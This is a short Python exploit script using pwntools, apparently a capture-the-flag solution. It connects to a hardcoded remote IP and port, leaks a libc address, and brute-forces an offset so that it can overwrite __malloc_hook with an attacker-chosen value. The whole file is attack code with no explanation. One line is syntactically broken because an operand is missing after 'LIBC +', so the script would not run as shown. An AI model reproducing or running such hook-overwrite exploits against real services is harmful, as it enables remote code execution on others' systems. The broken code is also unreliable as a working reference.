from pwn import *

REMOTE_OFFSET = 0x7f1f3fc91000 - 0x7f1f3f490010

def tryOut(offset):
	global stop
	p = remote("3.112.41.140", 56746)
	p.sendlineafter("Size:",str(0x800000))
	p.recvuntil("Magic:")
	addr = int(p.recvline(),16)
	LIBC = addr + offset
	log.info("LIBC: 0x%x"%LIBC)

	malloc_hook = LIBC + libc.symbols['__malloc_hook']
	
	index = (malloc_hook-addr)/8
	p.sendlineafter("Offset & Value:", "%x"%index)
	p.sendline("%x"%(LIBC + ))
	try:
		p.recvuntil("Offset & Value:")
		p.close()
		return
		
	except:
		p.close()
		stop = True

if __name__ == "__main__":
	stop = False
	offset = REMOTE_OFFSET
	libc = ELF("./libc.so.6")

	i = 0
	while not stop:
		log.info("trying out offset %x"%i)
		tryOut(REMOTE_OFFSET+0x1000*i)
		i-=1
	# in posdir, it goes up to 6
	# in negdir, it goes up to -1
	
